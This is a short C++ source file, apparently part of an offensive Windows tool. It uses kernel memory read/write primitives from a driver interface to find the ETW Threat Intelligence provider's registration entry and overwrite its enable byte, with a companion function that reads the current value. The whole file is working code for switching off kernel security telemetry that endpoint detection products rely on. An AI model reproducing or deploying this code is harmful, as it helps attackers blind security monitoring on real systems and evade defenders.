#include <iostream>
#include <Windows.h>
#include "DriverOps.h"
#include "FindOffset.h"
#include "DisableEtwTi.h"


void SetEtwTi(BOOL Enable) {
	DWORD64 EtwProvRegHandle, GUIDRegEntryAddress;
	Read64(GetKernelBaseAddress() + GetOffsets().EtwThreatIntProvRegHandleOffset, &EtwProvRegHandle);
	//assume offset of GUID entry = 0x20
	Read64(EtwProvRegHandle + 0x20, &GUIDRegEntryAddress);
	DWORD option = Enable ? 0x1 : 0x0;
	//assume offset of provider enable info = 0x60
	Write8(GUIDRegEntryAddress + 0x60, option);
	printf("Attempt to %s EtwTi\n", Enable ? "enable" : "disable");
}


void ReadEtwTi() {
	DWORD64 EtwProvRegHandle, GUIDRegEntryAddress;
	Read64(GetKernelBaseAddress() + GetOffsets().EtwThreatIntProvRegHandleOffset, &EtwProvRegHandle);
	//assume offset of GUID entry = 0x20
	Read64(EtwProvRegHandle + 0x20, &GUIDRegEntryAddress);
	//assume offset of provider enable info = 0x60
	BYTE option;
	Read8(GUIDRegEntryAddress + 0x60, &option);
	printf("EtwTi currect value: 0x%x\n", option);
}